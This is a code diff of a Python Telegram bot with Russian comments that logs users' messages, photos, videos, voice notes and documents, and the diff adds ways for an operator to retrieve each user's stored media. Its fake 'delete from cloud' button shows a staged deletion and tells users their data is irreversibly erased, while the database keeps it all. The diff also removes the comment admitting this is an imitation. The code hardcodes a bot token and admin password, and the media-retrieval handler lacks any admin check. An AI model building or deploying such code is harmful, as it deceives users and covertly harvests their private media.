@@ -6,17 +6,17 @@ from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.utils.keyboard import ReplyKeyboardBuilder
+from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
 
 # ==================== НАСТРОЙКИ ====================
-BOT_TOKEN = "8949058159:AAGd6WcDw8Z7rEQKS79oioazJpQtaygOLHw"  # Вставьте сюда токен вашего бота
+BOT_TOKEN = "8949058159:AAGd6WcDw8Z7rEQKS79oioazJpQtaygOLHw"  # Токен вашего бота
 ADMIN_PASSWORD = "VAYG7YLNEM"    # Пароль для доступа в админку
 
 # ==================== БАЗА ДАННЫХ ====================
 def init_db():
     conn = sqlite3.connect("bot_data.db")
     cursor = conn.cursor()
-    # Таблица активности пользователей
+    # Таблица активности пользователей (добавлена колонка file_id)
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS user_activity (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -25,6 +25,7 @@ def init_db():
             full_name TEXT,
             content_type TEXT,
             content_preview TEXT,
+            file_id TEXT,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     """)
@@ -37,12 +38,12 @@ def init_db():
     conn.commit()
     conn.close()
 
-def log_activity(user_id: int, username: str, full_name: str, content_type: str, preview: str):
+def log_activity(user_id: int, username: str, full_name: str, content_type: str, preview: str, file_id: str = None):
     conn = sqlite3.connect("bot_data.db")
     cursor = conn.cursor()
     cursor.execute(
-        "INSERT INTO user_activity (user_id, username, full_name, content_type, content_preview) VALUES (?, ?, ?, ?, ?)",
-        (user_id, username or "Без username", full_name, content_type, preview)
+        "INSERT INTO user_activity (user_id, username, full_name, content_type, content_preview, file_id) VALUES (?, ?, ?, ?, ?, ?)",
+        (user_id, username or "Без username", full_name, content_type, preview, file_id)
     )
     conn.commit()
     conn.close()
@@ -94,6 +95,14 @@ def get_admin_keyboard():
     builder.adjust(2, 2)
     return builder.as_markup(resize_keyboard=True)
 
+def get_user_media_inline_keyboard(user_id: int):
+    builder = InlineKeyboardBuilder()
+    builder.button(text="📸 Фотографии", callback_data=f"get_media:{user_id}:photo")
+    builder.button(text="🎥 Видео", callback_data=f"get_media:{user_id}:video")
+    builder.button(text="🎤 Голосовые", callback_data=f"get_media:{user_id}:voice")
+    builder.adjust(3)
+    return builder.as_markup()
+
 # ==================== БОТ И ДИСПАТЧЕР ====================
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
@@ -133,7 +142,6 @@ async def process_about_bot(message: types.Message):
 # --- Пользовательская кнопка "☁️ Удалить из облака" ---
 @dp.message(F.text == "☁️ Удалить из облака")
 async def process_fake_cloud_delete(message: types.Message):
-    # Имитация работы с облачным хранилищем
     status_msg = await message.answer("🔄 Подключение к облачному хранилищу...")
     await asyncio.sleep(1)
     
@@ -143,10 +151,7 @@ async def process_fake_cloud_delete(message: types.Message):
     await status_msg.edit_text("✅ Все данные успешно и безвозвратно удалены из облака!")
     await asyncio.sleep(1.5)
 
-    # Реальное поверхностное удаление истории сообщений из чата
     current_msg_id = message.message_id
-    
-    # Очищаем последние сообщения (до 20 штук назад)
     for msg_id in range(current_msg_id + 1, current_msg_id - 25, -1):
         try:
             await bot.delete_message(chat_id=message.chat.id, message_id=msg_id)
@@ -181,13 +186,12 @@ async def process_logout(message: types.Message, state: FSMContext):
     await state.clear()
     await message.answer("Вы вышли из админ-панели.", reply_markup=get_main_keyboard())
 
-# --- 4. Группированная статистика ---
+# --- 4. Группированная статистика с инлайн-кнопками медиа ---
 @dp.message(AdminStates.is_admin, F.text == "📊 Сохранённые данные")
 async def process_stats(message: types.Message):
     conn = sqlite3.connect("bot_data.db")
     cursor = conn.cursor()
 
-    # Получаем список уникальных пользователей
     cursor.execute("SELECT DISTINCT user_id, username, full_name FROM user_activity")
     users = cursor.fetchall()
 
@@ -199,25 +203,23 @@ async def process_stats(message: types.Message):
     await message.answer(f"📊 **Всего пользователей в базе:** {len(users)}\nФормирую итоговые отчеты...")
 
     for user_id, username, full_name in users:
-        # Считаем количество контента по типам
         cursor.execute(
             "SELECT content_type, COUNT(*) FROM user_activity WHERE user_id = ? GROUP BY content_type",
             (user_id,)
         )
         stats = dict(cursor.fetchall())
 
-        # Получаем 5 последних записей пользователя
         cursor.execute(
             "SELECT content_type, content_preview, created_at FROM user_activity WHERE user_id = ? ORDER BY id DESC LIMIT 5",
             (user_id,)
         )
         recent_items = cursor.fetchall()
 
-        # Формируем текст сообщения
         text_count = stats.get("text", 0)
         photo_count = stats.get("photo", 0)
+        video_count = stats.get("video", 0)
         voice_count = stats.get("voice", 0)
-        other_count = sum(count for c_type, count in stats.items() if c_type not in ["text", "photo", "voice"])
+        other_count = sum(count for c_type, count in stats.items() if c_type not in ["text", "photo", "video", "voice"])
 
         report = (
             f"👤 **Пользователь:** {full_name} (@{username})\n"
@@ -225,6 +227,7 @@ async def process_stats(message: types.Message):
             f"📈 **Активность:**\n"
             f" 📝 Текстов: {text_count}\n"
             f" 🖼 Фото: {photo_count}\n"
+            f" 🎥 Видео: {video_count}\n"
             f" 🎙 Голосовых: {voice_count}\n"
             f" 📦 Прочее: {other_count}\n\n"
             f"🕒 **Последние записи:**\n"
@@ -233,11 +236,48 @@ async def process_stats(message: types.Message):
         for c_type, preview, created_at in recent_items:
             report += f"• [{created_at}] ({c_type}): {preview}\n"
 
-        await message.answer(report, parse_mode="Markdown")
+        await message.answer(
+            report, 
+            parse_mode="Markdown", 
+            reply_markup=get_user_media_inline_keyboard(user_id)
+        )
 
     conn.close()
 
-# --- 5. Бан и разбан ---
+# --- 5. Обработчик клика по инлайн-кнопкам медиа ---
+@dp.callback_query(F.data.startswith("get_media:"))
+async def process_get_media_callback(callback: types.CallbackQuery):
+    _, target_user_id, media_type = callback.data.split(":")
+    target_user_id = int(target_user_id)
+
+    conn = sqlite3.connect("bot_data.db")
+    cursor = conn.cursor()
+
+    cursor.execute(
+        "SELECT file_id, content_preview FROM user_activity WHERE user_id = ? AND content_type = ? AND file_id IS NOT NULL",
+        (target_user_id, media_type)
+    )
+    media_records = cursor.fetchall()
+    conn.close()
+
+    if not media_records:
+        await callback.answer("У этого пользователя нет сохраненных файлов данного типа.", show_alert=True)
+        return
+
+    await callback.answer("Отправляю файлы...")
+
+    for file_id, caption in media_records:
+        try:
+            if media_type == "photo":
+                await bot.send_photo(callback.from_user.id, photo=file_id, caption=caption)
+            elif media_type == "video":
+                await bot.send_video(callback.from_user.id, video=file_id, caption=caption)
+            elif media_type == "voice":
+                await bot.send_voice(callback.from_user.id, voice=file_id)
+        except Exception as e:
+            logging.error(f"Ошибка при отправке медиафайла: {e}")
+
+# --- 6. Бан и разбан ---
 @dp.message(AdminStates.is_admin, F.text == "⛔ Забанить (Инструкция)")
 async def ban_instruction(message: types.Message, state: FSMContext):
     await state.set_state(AdminStates.waiting_for_ban_id)
@@ -268,24 +308,32 @@ async def process_unban_id(message: types.Message, state: FSMContext):
     await state.set_state(AdminStates.is_admin)
     await message.answer(f"✅ Пользователь с ID `{user_id}` успешно разбанен!", parse_mode="Markdown")
 
-# --- 6. Сохранение пользовательского контента ---
+# --- 7. Сохранение пользовательского контента ---
 @dp.message()
 async def handle_user_content(message: types.Message):
     user = message.from_user
     content_type = "unknown"
     preview = ""
+    file_id = None
 
     if message.text:
         content_type = "text"
         preview = message.text[:50]
     elif message.photo:
         content_type = "photo"
+        file_id = message.photo[-1].file_id
         preview = message.caption[:50] if message.caption else "[Фотография]"
+    elif message.video:
+        content_type = "video"
+        file_id = message.video.file_id
+        preview = message.caption[:50] if message.caption else "[Видео]"
     elif message.voice:
         content_type = "voice"
+        file_id = message.voice.file_id
         preview = f"[Голосовое {message.voice.duration} сек.]"
     elif message.document:
         content_type = "document"
+        file_id = message.document.file_id
         preview = f"[Документ: {message.document.file_name}]"
 
     log_activity(
@@ -293,7 +341,8 @@ async def handle_user_content(message: types.Message):
         username=user.username,
         full_name=user.full_name,
         content_type=content_type,
-        preview=preview
+        preview=preview,
+        file_id=file_id
     )
 
     await message.answer("Ваши данные успешно сохранены!")
